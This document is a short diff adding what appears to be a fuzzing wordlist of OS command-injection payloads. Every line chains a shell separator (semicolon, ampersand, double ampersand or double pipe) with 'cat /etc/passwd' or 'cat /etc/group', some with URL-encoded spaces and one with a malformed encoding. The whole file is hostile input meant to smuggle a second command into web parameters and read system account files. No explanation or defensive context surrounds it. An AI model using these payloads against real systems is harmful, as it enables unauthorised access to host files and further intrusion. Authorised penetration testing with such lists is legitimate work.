@@ -1,0 +1,9 @@
+;cat%20/etc/passwd
+;cat /etc/passwd
+;cat%20/etc/group
+&&cat%20/etc/passwd
+&cat%20/etc/passwd
+&cat /etc/passwd
+||cat&20/etc/passwd
+||cat /etc/passwd
+
